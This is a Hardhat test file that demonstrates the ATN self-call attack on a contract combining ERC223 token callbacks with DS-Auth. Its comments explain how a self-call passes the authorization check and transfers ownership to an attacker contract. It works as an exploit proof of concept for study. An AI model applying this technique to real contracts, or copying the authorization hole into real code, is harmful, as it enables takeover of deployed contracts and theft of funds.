import { expect } from "chai";
import { network } from "hardhat";
import { ContractEventPayload, parseEther } from "ethers";

const { ethers } = await network.connect();

describe("ERC223 + DS-Auth ATN Attack (Self-Call Vulnerability)", function () {
    let vulnerableReceiver: any;
    let attackerContract: any;
    let owner: any;
    let attacker: any;

    async function createUsers(transferFrom: any, userCount: number) {
        const users = [];
        for (let i = 0; i < userCount; i++) {
            const user = ethers.Wallet.createRandom(ethers.provider);
            await transferFrom.sendTransaction({
                to: user.address,
                value: parseEther("100"),
            });
            users.push(user);
        }
        return users;
    }

    beforeEach(async function () {
        [owner] = await ethers.getSigners();
        [attacker] = await createUsers(owner, 1);

        // Deploy vulnerable receiver (inherits both ERC223Token and DS-Auth)
        // VulnerableReceiver constructor takes no parameters
        const VulnerableFactory = await ethers.getContractFactory("VulnerableReceiver");
        vulnerableReceiver = await VulnerableFactory.deploy();
        await vulnerableReceiver.waitForDeployment();

        // Deploy attacker contract
        // ATNAttacker constructor takes only target address
        const AttackerFactory = await ethers.getContractFactory("ATNAttacker");
        attackerContract = await AttackerFactory.connect(attacker).deploy(await vulnerableReceiver.getAddress())
        await attackerContract.waitForDeployment();

        // Mint tokens to attacker contract for attack
        // VulnerableReceiver is itself a token, so we mint its own tokens
        await vulnerableReceiver.mint(await attackerContract.getAddress(), parseEther("1000"));
    });

    describe("Initial State", function () {
        it("Should have correct initial owner", async function () {
            const ownerAddress = await vulnerableReceiver.owner();
            expect(ownerAddress).to.equal(owner.address);

            console.log("Initial state:");
            console.log("  VulnerableReceiver address:", await vulnerableReceiver.getAddress());
            console.log("  Owner:", ownerAddress);
            console.log("  ⚠️  VulnerableReceiver is both ERC223Token and DS-Auth");
            console.log("  ⚠️  isAuthorized allows address(this) - this is the vulnerability!");
        });

        it("Should have tokens in attacker contract", async function () {
            const balance = await vulnerableReceiver.balanceOf(await attackerContract.getAddress());
            expect(balance).to.equal(parseEther("1000"));
        });
    });

    describe("ATN Attack - Self-Call Vulnerability", function () {
        it("Should successfully execute ATN attack using self-call and change owner", async function () {
            const originalOwner = await vulnerableReceiver.owner();
            expect(originalOwner).to.equal(owner.address);

            console.log("\n=== ATN Attack Execution (Self-Call) ===");
            console.log("Before attack:");
            console.log("  Original owner:", originalOwner);
            console.log("  VulnerableReceiver:", await vulnerableReceiver.getAddress());
            console.log("  Attacker address:", attacker.address);


            // watch all the events
            // vulnerableReceiver.on("*", (event: ContractEventPayload) => {
            //     // log 
            //     console.log("VulnerableReceiver Event type:", event.eventName);
            //     console.log("VulnerableReceiver Event args:", event.args);
            // });

            // Execute attack
            // The attacker contract calls vulnerableReceiver.transferFrom
            // This triggers vulnerableReceiver to call its own setOwner function
            // Since it's calling itself, msg.sender is address(this), which passes isAuthorized check
            const tx = await attackerContract.connect(attacker).attack();

            const receipt = await tx.wait();
            const newOwner = await vulnerableReceiver.owner();
            console.log("\nAfter attack:");
            console.log("  Transaction hash:", receipt?.hash);
            console.log("  Gas used:", receipt?.gasUsed?.toString());
            console.log("  New owner:", newOwner);
            console.log("  Attack successful:", newOwner === attacker.address);
            console.log("========================================\n");

            // Verify attack succeeded
            expect(newOwner).to.equal(attacker.address);
            expect(newOwner).to.not.equal(originalOwner);

            // vulnerableReceiver.removeAllListeners()
            // attackerContract.removeAllListeners()
        });

    });
});
